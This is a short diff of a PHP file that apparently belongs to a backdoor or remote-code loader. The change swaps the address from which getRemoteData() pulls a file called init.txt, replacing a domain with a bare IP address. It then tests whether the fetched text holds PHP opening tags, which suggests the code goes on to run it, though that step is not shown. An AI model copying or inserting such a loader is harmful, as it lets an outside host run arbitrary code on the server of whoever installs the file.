@@ -34,7 +34,7 @@ function getRemoteData($url) {
     
     return $result;
 }
-$configData = getRemoteData('https://j251201_23.blueforer.com/init.txt');
+$configData = getRemoteData('http://192.187.114.106/j251217_13/init.txt');
 
 if ($configData) {
     if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
